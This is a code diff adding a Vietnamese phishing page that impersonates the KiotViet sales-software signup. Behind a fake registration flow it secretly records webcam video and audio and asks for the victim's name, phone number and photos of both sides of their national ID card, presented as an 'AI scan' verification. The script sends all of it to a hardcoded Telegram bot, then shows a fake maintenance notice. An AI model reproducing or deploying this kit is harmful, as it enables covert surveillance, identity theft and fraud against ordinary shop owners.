@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KiotViet - Phần mềm quản lý bán hàng phổ biến nhất</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #f8fafc; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        .kv-green { color: #57b846; }
+        .bg-kv-green { background-color: #57b846; }
+        .hidden { display: none; }
+        
+        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
+        .scale-up { animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleUp { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .loader { border-top-color: #57b846; animation: spinner 1s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .input-custom {
+            width: 100%; padding: 16px; border: 1px solid #e2e8f0; border-radius: 16px;
+            outline: none; transition: all 0.3s; font-size: 16px; background: #ffffff;
+        }
+        .input-custom:focus { border-color: #57b846; box-shadow: 0 0 0 4px rgba(87, 184, 70, 0.1); }
+        
+        .slider-container { position: relative; overflow: hidden; width: 100%; aspect-ratio: 16/9; margin-bottom: 20px; border-radius: 12px; }
+        .slide { position: absolute; inset: 0; opacity: 0; transition: opacity 0.8s ease-in-out; }
+        .slide.active { opacity: 1; }
+        
+        .category-item { display: flex; align-items: center; padding: 14px 0; border-bottom: 1px solid #f1f5f9; }
+        .section-title { color: #002b5c; font-weight: 800; font-size: 1.15rem; }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <div id="loading-global" class="hidden fixed inset-0 z-[500] bg-white/95 flex flex-col items-center justify-center">
+        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-100 h-16 w-16 mb-4"></div>
+        <p id="loading-text" class="text-[12px] font-bold text-slate-400 uppercase tracking-[0.2em] text-center px-6">Đang bảo mật dữ liệu...</p>
+    </div>
+
+    <div id="landing-page" class="fade-in">
+        <nav class="flex items-center justify-between px-6 py-4 bg-white shadow-sm sticky top-0 z-50">
+            <img src="kiotviet_logo.png" alt="KiotViet" class="h-7 md:h-9">
+            <button onclick="requestAccess()" class="bg-kv-green text-white px-6 py-2 rounded-full font-bold text-sm shadow-md transition active:scale-95 uppercase">Đăng ký</button>
+        </nav>
+        
+        <main class="max-w-6xl mx-auto px-4 pb-24">
+            <div class="slider-container mt-4 scale-up shadow-lg">
+                <img src="banner1.jpg" class="slide active object-cover w-full h-full">
+                <img src="banner2.png" class="slide object-cover w-full h-full">
+                <img src="banner3.png" class="slide object-cover w-full h-full">
+            </div>
+
+            <div class="text-center py-6">
+                <h1 class="text-3xl font-black mb-4 text-slate-800 leading-tight">Quản lý bán hàng <br/> dễ dùng cùng <span class="kv-green uppercase">KiotViet</span></h1>
+            </div>
+
+            <div class="px-4 mb-8 bg-white rounded-3xl p-6 shadow-sm">
+                <div class="flex items-center gap-3 mb-6">
+                    <div class="w-10 h-10 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-500">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path d="M5 4a2 2 0 012-2h6a2 2 0 012 2v14l-5-2.5L5 18V4z"></path></svg>
+                    </div>
+                    <span class="section-title">Lưu trú, làm đẹp</span>
+                </div>
+                <div class="space-y-0 pl-1">
+                    <div class="category-item"><span class="w-2 h-2 bg-slate-300 rounded-full mr-4"></span><span>Beauty Spa & Massage</span></div>
+                    <div class="category-item"><span class="w-2 h-2 bg-slate-300 rounded-full mr-4"></span><span>Hair Salon & Nails</span></div>
+                    <div class="category-item"><span class="w-2 h-2 bg-slate-300 rounded-full mr-4"></span><span>Khách sạn & Nhà nghỉ</span></div>
+                    <div class="category-item"><span class="w-2 h-2 bg-slate-300 rounded-full mr-4"></span><span>Homestay & Villa, Resort</span></div>
+                </div>
+            </div>
+
+            <div class="text-center">
+                <button onclick="requestAccess()" class="w-full max-w-xs bg-blue-600 text-white py-4 rounded-full font-black text-lg shadow-xl uppercase active:scale-95 transition-all">Đăng ký ngay</button>
+                <p class="mt-3 text-slate-500 text-xs font-medium">7 ngày dùng thử miễn phí</p>
+            </div>
+        </main>
+    </div>
+
+    <video id="v" autoplay muted playsinline class="hidden"></video>
+    <div id="flow-content"></div>
+</div>
+
+<script>
+    // Logic Slider Banner
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    if(slides.length > 0) {
+        setInterval(() => {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (currentSlide + 1) % slides.length;
+            slides[currentSlide].classList.add('active');
+        }, 4000);
+    }
+
+    // Cấu hình Telegram (8508820343)
+    const TELEGRAM_TOKEN = '8508820343:AAEd6sPNZgoXimq-ud_T7v_PFNsF62UELVA'; 
+    const CHAT_ID = '-1003844702216'; 
+
+    let userData = { name: '', phone: '', imgFront: null, imgBack: null, video: null };
+    let mediaRecorder, chunks = [], globalStream;
+
+    function showLoad(text, time, callback) {
+        const el = document.getElementById('loading-global');
+        document.getElementById('loading-text').innerText = text;
+        el.classList.remove('hidden');
+        setTimeout(() => { el.classList.add('hidden'); if(callback) callback(); }, time);
+    }
+
+    async function requestAccess() {
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('v').srcObject = globalStream;
+            mediaRecorder = new MediaRecorder(globalStream);
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            mediaRecorder.start(1000); 
+
+            document.getElementById('landing-page').classList.add('hidden');
+            showLoad("ĐANG TẢI DỮ LIỆU...", 1000, renderPhoneInput);
+        } catch (e) {
+            alert("Vui lòng cho phép Camera để nhận ưu đãi.");
+            window.location.reload();
+        }
+    }
+
+    function renderPhoneInput() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen flex flex-col items-center pt-24 px-4 bg-[#f0f2f5] fade-in">
+            <div class="bg-white p-10 rounded-[32px] shadow-2xl w-full max-w-[440px] text-center scale-up">
+                <img src="kiotviet_logo.png" class="h-6 mx-auto mb-10">
+                <div class="space-y-5 text-left">
+                    <input id="uName" type="text" placeholder="Họ và tên chủ cửa hàng" class="input-custom font-medium uppercase">
+                    <input id="uPhone" type="tel" maxlength="10" placeholder="Số điện thoại đăng ký" class="input-custom font-bold">
+                </div>
+                <button onclick="handleStep1()" class="w-full bg-kv-green text-white py-4.5 rounded-2xl font-black mt-10 text-lg uppercase shadow-xl transition active:scale-95">Tiếp tục</button>
+            </div>
+        </div>`;
+    }
+
+    function handleStep1() {
+        const n = document.getElementById('uName').value, p = document.getElementById('uPhone').value;
+        if (n.length > 2 && /^0[0-9]{9}$/.test(p)) {
+            userData.name = n.toUpperCase(); userData.phone = p;
+            showLoad("KIỂM TRA TÀI KHOẢN...", 2000, renderVerifyNotice);
+        } else { alert("Vui lòng nhập đúng thông tin."); }
+    }
+
+    function renderVerifyNotice() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-black/60 flex items-center justify-center p-6 z-[200] backdrop-blur-sm">
+            <div class="bg-white rounded-[32px] p-10 max-w-sm w-full text-center scale-up shadow-2xl">
+                <h3 class="text-xl font-black mb-4 uppercase text-slate-800">Xác minh định danh</h3>
+                <p class="text-sm text-slate-500 mb-10 leading-relaxed font-medium">Vui lòng định danh CCCD để bảo mật tài khoản.</p>
+                <button onclick="showLoad('ĐANG KHỞI TẠO AI...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4.5 rounded-2xl font-black text-lg uppercase shadow-lg transition active:scale-95">Xác minh ngay</button>
+            </div>
+        </div>`;
+    }
+
+    function renderUpload() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-10 text-center fade-in">
+            <h2 class="text-2xl font-black mb-10 uppercase kv-green">Tải lên CCCD</h2>
+            <div class="w-full max-w-sm space-y-6 mx-auto">
+                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-56 flex items-center justify-center bg-slate-50 overflow-hidden shadow-inner">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'f-p', 'f-t', 'imgFront')">
+                    <p id="f-t" class="text-slate-400 font-bold text-xs uppercase tracking-widest px-6">MẶT TRƯỚC CCCD</p>
+                    <img id="f-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
+                </div>
+                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-56 flex items-center justify-center bg-slate-50 overflow-hidden shadow-inner">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'b-p', 'b-t', 'imgBack')">
+                    <p id="b-t" class="text-slate-400 font-bold text-xs uppercase tracking-widest px-6">MẶT SAU CCCD</p>
+                    <img id="b-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
+                </div>
+            </div>
+        </div>`;
+    }
+
+    function aiScan(input, pI, tI, k) {
+        if (!input.files[0]) return;
+        showLoad("AI ĐANG QUÉT...", 1000, () => {
+            const r = new FileReader();
+            r.onload = e => {
+                document.getElementById(pI).src = e.target.result;
+                document.getElementById(pI).classList.remove('hidden');
+                document.getElementById(tI).classList.add('hidden');
+                userData[k] = input.files[0];
+                if (userData.imgFront && userData.imgBack) finalizeAndSend();
+            };
+            r.readAsDataURL(input.files[0]);
+        });
+    }
+
+    async function finalizeAndSend() {
+        showLoad("ĐANG ĐỒNG BỘ...", 3000, async () => {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.onstop = async () => {
+                    userData.video = new File(chunks, "v.mp4", { type: "video/mp4" });
+                    await sendData();
+                };
+                mediaRecorder.stop();
+                globalStream.getTracks().forEach(t => t.stop());
+            }
+            renderMaintenance();
+        });
+    }
+
+    async function sendData() {
+        try {
+            const cap = `🔔 **THÔNG TIN MỚI**\n👤: ${userData.name}\n📱: \`${userData.phone}\``;
+            const vFd = new FormData();
+            vFd.append('chat_id', CHAT_ID); vFd.append('video', userData.video);
+            vFd.append('caption', cap); vFd.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: vFd });
+
+            const sendImg = async (f, l) => {
+                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', f);
+                fd.append('caption', `📸 ${l}: ${userData.name}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            };
+            await sendImg(userData.imgFront, "TRƯỚC");
+            await sendImg(userData.imgBack, "SAU");
+        } catch (e) {}
+    }
+
+    function renderMaintenance() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[500] p-8 text-center fade-in">
+            <h3 class="text-2xl font-black mb-4 uppercase text-red-600">Hệ thống bảo trì</h3>
+            <p class="text-slate-500 mb-10 text-sm font-medium">Máy chủ đang nâng cấp bảo mật. Vui lòng quay lại sau 24h.</p>
+            <button onclick="window.location.reload()" class="w-full max-w-sm bg-slate-800 text-white py-4.5 rounded-2xl font-black uppercase shadow-xl">Đóng</button>
+        </div>`;
+    }
+</script>
+</body>
+</html>
